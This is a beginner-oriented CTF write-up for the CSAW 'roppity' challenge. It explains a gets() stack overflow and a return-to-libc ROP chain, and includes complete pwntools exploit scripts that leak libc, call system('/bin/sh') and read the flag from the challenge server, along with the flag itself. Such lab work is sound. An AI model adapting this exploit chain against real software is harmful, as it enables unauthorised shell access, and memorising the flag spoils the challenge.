## roppity [50]
*Welcome to pwn!*

`nc pwn.chal.csaw.io 5016`

Files: `rop`, `libc-2.27.so`

##### This challenge was quickly finished with [`pwnscripts`](https://github.com/152334H/pwnscripts). Try it!

Some parts of this write-up may seem overtly verbose; it's written with beginners in mind.
### Short investigation
```python
$ checksec ./rop
[*] '/path/to/rop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
`rop` is a rather simple binary, starting and ending at `main()`:
```c
int init() { return setvbuf(_bss_start, 0, 2, 0); }
int main() {
  char s[20]; // [rsp+0h] [rbp-20h]
  init();
  puts("Hello");
  gets(s);
}
```
`gets()` allows for an infinitely long input (hypothetically) from the user, so there is a very simple linear [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow) off of `s[]` to overwrite `main()`'s return pointer. Since the binary has `No canary found`, but has `NX Enabled` as a security measure (and also because the challenge is named `roppity`), the solution to this challenge must be [Return Oriented Programming](https://ropemporium.com/index.html). The challenge helpfully provides a `libc-2.27.so`, so the objective of the challenge should be to open a remote shell via a [return-to-libc](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2libc) attack.

Hopefully you understood all of that. If you've personally done all of those things before, then the implementation should be easy to follow too:
1. Use a jump to `puts()`, a `pop rdi` gadget, and the Global Offset Table to leak libc address (i.e. execute `puts(GOT['puts'])` with a ROP chain). `pwntools`' `ROP()` is extremely useful for building this quickly.
2. In the *same ROP chain*, have a final jump back to the start of `main()`. This is so that we can send a *second* ROP chain in step 4.
3. Using the output of `puts()`, calculate the ASLR base of libc in memory, and then find the libc addresses of `system` and a `/bin/sh` string from there. `pwnscripts` helps to automate this part.
3. Write a second ROP chain to call `system("/bin/sh")`. This is similar to step 1; you're just replacing `puts` with `system` and `GOT['puts']` with `"/bin/sh"`.

After all of that, an ideal script may look like this in implementation:
```python
from pwnscripts import *
context.binary = './rop'
puts_got = context.binary.got['puts']
def overflow(b:bytes): return r.sendlineafter('Hello\n', 0x28*b'a' + b)

r = context.binary.process()
rop = ROP(context.binary)
rop.puts(puts_got)
rop.main()

db = libc_db('./libc-database', binary='/lib/x86_64-linux-gnu/libc.so.6')
system = db.symbols['system']
bin_sh = db.symbols['str_bin_sh']
overflow(rop.chain())
base = db.calc_base('puts', extract_first_bytes(r.recvline().strip(), 6))

rop = ROP(context.binary)
rop.call(system+base, [bin_sh+base])
overflow(rop.chain())
r.interactive()
```
Strangely enough, this led to an EOFError on remote, despite working locally. This is potentially the fault of [alignment issues](https://ropemporium.com/guide.html#Common%20pitfalls), but I did not probe too deeply.

After some testing, the exploit is modified to become:
1. leak libc address with ROP to `puts()`. Calculate the libc address of `system` and a `/bin/sh` string here.
2. In the *same ROP chain*, have a call to `gets(bss+...)`. `bss+...` serves as a known memory location to store data we want.
3. Still in the same ROP chain, have a final jump back to the start of `main()`.
4. The `gets()` call will run first. Write a command like `/bin/sh` here.
5. Back in `main()`, write a second ROP chain to call `system(bss+...)`.

With that, it works on remote. The final script used is at the end of this writeup.

### Flag
`flag{r0p_4ft3r_r0p_4ft3R_r0p}`

### Code
```python
from pwnscripts import *
context.binary = './rop'
scratch = context.binary.bss(0x40)  # _bss_start will not work (setvbuf?)
puts_got = context.binary.got['puts']
pad = 0x28*b'a'
def overflow(b:bytes): return r.sendlineafter('Hello\n', pad + b)

# Step 1: rop chain to leak libc && write down a command (see: Weirdly)
r = remote('pwn.chal.csaw.io', 5016)
rop = ROP(context.binary)
rop.puts(puts_got)
rop.gets(scratch)   # Weirdly, removing this terminates the remote connection
rop.main()          # go back to main afterwards

overflow(rop.chain())
db = libc_db('./libc-database', binary='./libc-2.27.so')
system = db.symbols['system']
base = db.calc_base('puts', extract_first_bytes(r.recvline().strip(), 6))

# Step 2: call a shell command with libc.system()
r.sendline('cat flag.txt\0')
rop = ROP(context.binary)
rop.call(system+base, [scratch])

overflow(rop.chain())
print(r.recvline())
```